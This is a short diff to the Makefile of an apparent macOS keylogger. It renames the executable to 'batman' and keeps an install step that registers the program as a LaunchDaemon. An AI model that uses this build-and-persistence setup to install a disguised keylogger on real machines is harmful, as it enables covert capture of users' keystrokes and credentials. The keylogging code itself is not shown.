@@ -1,14 +1,10 @@
-CC=gcc
-CFLAGS=-framework ApplicationServices -framework Carbon
-SOURCES=keylogger.c
-EXECUTABLE=keylogger
+EXECUTABLE=batman
 PLIST=keylogger.plist
 INSTALLDIR=/usr/local/bin
-PLISTDIR=/Library/LaunchDaemons
-PLISTFULL=$(PLISTDIR)/$(PLIST)
+PLISTFULL=/Library/LaunchDaemons/$(PLIST)
 
-all: $(SOURCES)
-	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)
+all: keylogger.c
+	gcc keylogger.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)
 
 install: all
 	mkdir -p $(INSTALLDIR)
